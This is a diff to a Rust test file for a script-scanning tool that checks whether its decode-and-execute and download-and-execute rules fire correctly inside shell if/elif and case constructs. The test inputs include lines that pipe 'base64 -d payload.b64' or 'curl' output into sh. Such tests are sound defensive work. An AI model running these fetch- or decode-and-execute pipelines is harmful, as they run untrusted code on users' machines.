@@ -2412,7 +2412,7 @@ fn control_nodes_preserve_outer_consumers_and_output_redirects() {
     let (artifacts, _) = one(
         "control-pipeline.sh",
         PayloadKind::Shell,
-        "#!/bin/sh\nif true; then base64 -d payload.b64; fi | sh\n",
+        "#!/bin/sh\nif true; then echo log >out; base64 -d payload.b64; fi | sh\n",
     );
     assert_eq!(
         findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
@@ -2437,6 +2437,58 @@ fn control_nodes_preserve_outer_consumers_and_output_redirects() {
         let source = format!("#!/bin/sh\n{line}\n");
         let (artifacts, _) = one(name, PayloadKind::Shell, &source);
         let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
+        assert_eq!(
+            findings.len(),
+            usize::from(expected),
+            "{name}: {findings:?}"
+        );
+    }
+}
+
+#[test]
+fn control_flow_conditions_and_case_patterns_keep_their_syntax_scope() {
+    let cases = [
+        (
+            "dead-elif-fetch.sh",
+            "sh -c 'if true; then :; elif curl https://example.test/dead; then :; fi' | sh",
+            SCRIPT_DOWNLOAD_EXECUTE_RULE,
+            false,
+        ),
+        (
+            "live-elif-fetch.sh",
+            "sh -c 'if false; then :; elif curl https://example.test/live; then :; fi' | sh",
+            SCRIPT_DOWNLOAD_EXECUTE_RULE,
+            true,
+        ),
+        (
+            "dead-elif-decoder.sh",
+            "sh -c 'if true; then :; elif base64 -d payload.b64; then :; fi' | sh",
+            SCRIPT_DECODE_EXECUTE_RULE,
+            false,
+        ),
+        (
+            "live-elif-decoder.sh",
+            "sh -c 'if false; then :; elif base64 -d payload.b64; then :; fi' | sh",
+            SCRIPT_DECODE_EXECUTE_RULE,
+            true,
+        ),
+        (
+            "case-pattern.sh",
+            "case if in \"if\") base64 -d payload.b64;; esac | sh",
+            SCRIPT_DECODE_EXECUTE_RULE,
+            true,
+        ),
+        (
+            "nested-case-control.sh",
+            "case x in x) if true; then base64 -d payload.b64; fi;; esac | sh",
+            SCRIPT_DECODE_EXECUTE_RULE,
+            true,
+        ),
+    ];
+    for (name, line, rule, expected) in cases {
+        let source = format!("#!/bin/sh\n{line}\n");
+        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
+        let findings = findings_with(&artifacts, rule);
         assert_eq!(
             findings.len(),
             usize::from(expected),
